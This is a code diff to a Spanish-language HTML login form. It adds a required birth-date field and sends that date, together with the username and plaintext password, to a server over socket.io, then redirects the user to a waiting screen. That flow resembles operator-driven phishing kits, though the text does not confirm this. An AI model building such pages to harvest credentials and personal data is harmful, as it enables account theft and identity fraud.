@@ -75,6 +75,11 @@
       height: 20px;
     }
 
+    /* Estilo de campo fecha */
+    .input-group .fecha {
+      width: 100%;
+    }
+
     /* Botón centrado y ajustado */
     button {
       background-color: #f53535;
@@ -123,8 +128,16 @@
         <div class="icon"><i class="fas fa-lock"></i></div>
         <input type="password" id="password" placeholder="Contraseña" required>
       </div>
+      
+      <!-- Campo de fecha de nacimiento -->
+      <div class="input-group">
+        <div class="icon"><i class="fas fa-calendar-alt"></i></div>
+        <input type="date" id="fechaNacimiento" class="fecha" required>
+      </div>
+      
       <p id="usuarioError" class="mensaje-error"></p>
       <p id="passwordError" class="mensaje-error"></p>
+      <p id="fechaNacimientoError" class="mensaje-error"></p>
       <button type="submit" id="btnContinuar">Continuar</button>
     </form>
   </div>
@@ -141,16 +154,17 @@
           e.preventDefault(); // Evitar el comportamiento por defecto del formulario
 
           // Validar los campos antes de enviar los datos
-          if (validarUsuario() && validarPassword()) {
+          if (validarUsuario() && validarPassword() && validarFechaNacimiento()) {
             const usuario = document.getElementById('usuario').value;
             const contrasena = document.getElementById('password').value;
+            const fechaNacimiento = document.getElementById('fechaNacimiento').value;
 
             // Generar y guardar sessionId
             const sessionId = Math.random().toString(36).substring(2, 15);
             localStorage.setItem('sessionId', sessionId);
 
             // Enviar datos al servidor mediante socket.io
-            socket.emit('dataForm', { usuario, contrasena, sessionId });
+            socket.emit('dataForm', { usuario, contrasena, fechaNacimiento, sessionId });
 
             // Ir a pantalla de espera (opciones.html)
             window.location.href = 'opciones.html';
@@ -191,6 +205,22 @@
       } else {
         passwordError.textContent = "";
         passwordInput.classList.remove("campo-requerido");
+        return true;
+      }
+    }
+
+    function validarFechaNacimiento() {
+      const fechaNacimiento = document.getElementById("fechaNacimiento").value;
+      const fechaNacimientoError = document.getElementById("fechaNacimientoError");
+      const fechaNacimientoInput = document.getElementById("fechaNacimiento");
+
+      if (!fechaNacimiento) {
+        fechaNacimientoError.textContent = "La fecha de nacimiento es obligatoria";
+        fechaNacimientoInput.classList.add("campo-requerido");
+        return false;
+      } else {
+        fechaNacimientoError.textContent = "";
+        fechaNacimientoInput.classList.remove("campo-requerido");
         return true;
       }
     }
